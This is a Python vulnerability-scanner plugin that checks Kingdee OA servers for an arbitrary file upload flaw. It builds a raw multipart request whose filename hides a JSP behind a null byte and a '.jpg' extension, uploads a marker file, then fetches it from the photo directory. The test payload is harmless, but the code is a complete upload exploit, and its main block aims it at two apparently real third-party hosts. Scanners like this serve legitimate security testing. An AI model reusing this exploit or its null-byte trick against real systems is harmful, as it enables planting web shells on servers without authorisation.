#/usr/bin/python
#-*- coding: utf-8 -*-
#Refer http://www.wooyun.org/bugs/wooyun-2015-0139615
#__Author__ = 上善若水
#_PlugName_ = kingdee Plugin
#_FileName_ = kingdee.py


def assign(service, arg):
    if service == "kingdee_oa":
        return True, arg    

def audit(arg):
    raw = '''
POST /kingdee/document/upphoto_action.jsp HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
'''
    raw += "Referer: {}/kingdee/document/upphoto.jsp".format(arg)
    raw +='''
Cookie: JSESSIONID=abcHHjTI8tbcX9b1h5Ggv
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------2984167512327
Content-Length: 219

-----------------------------2984167512327
'''
    raw += "Content-Disposition: form-data; name=\"photo\"; filename=\"testvul.jsp" + chr(0) +".jpg\""
    raw += '''
Content-Type: image/jpeg

testvul_file_upload_test
-----------------------------2984167512327--

    '''
    url = arg + 'kingdee/document/upphoto_action.jsp'
    # proxy=('127.0.0.1',1234)
    # code, head,res, errcode, _ = curl.curl2(url,proxy=proxy,raw=raw)
    code1, head1, res1, errcode1, _url1 = curl.curl2(url,raw=raw)
    shell_path = 'kingdee/document/photo/testvul.jsp'
    code2, head2, res2, errcode2, _url2 = curl.curl2(arg+shell_path)
    if code2 == 200 and 'testvul_file_upload_test' in res2: 
        security_hole(url)
            
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('kingdee_oa', 'http://oa.guanhao.com:8080/')[1])
    audit(assign('kingdee_oa', 'http://220.189.244.202:8080/')[1])